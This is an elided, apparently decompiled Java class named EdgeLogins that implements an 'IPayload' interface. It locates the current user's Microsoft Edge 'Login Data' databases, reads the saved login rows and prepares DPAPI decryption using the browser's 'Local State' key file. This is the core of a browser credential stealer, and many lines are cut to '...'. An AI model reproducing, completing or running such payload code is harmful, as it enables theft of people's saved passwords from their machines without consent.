...
public class EdgeLogins implements IPayload
{
    ...
    public void run() {
        ...
        try {
            ...
            final ArrayList<String> list = getEdgeInfo();
    ...
    public static ArrayList<String> getEdgeInfo() {
        ...
        try {
            ...
            for (final File file : FileUtil.getFiles("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\Microsoft\\Edge\\User Data")) {
                if (file.getName().contains("Login Data")) {
                    ...
                    while (rs != null && rs.next()) {
                        ...
                        else if (url.length() > 40 && EdgeLogins.shorten) {
        ...
        try {
            ...
            if (WinDPAPI.isPlatformSupported()) {
                ...
                if (!isV10) {
                    ...
                    if (StringUtils.isEmpty((CharSequence)EdgeLogins.localStateFileFullPathAndName)) {
                        throw new IllegalArgumentException("Local State is required");
                    }
                    final String localState = FileUtils.readFileToString(new File(EdgeLogins.localStateFileFullPathAndName));
    ...
    static {
        localStateFileFullPathAndName = "C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State";
        EdgeLogins.shorten = true;
        EdgeLogins.obfus = false;
    }
}
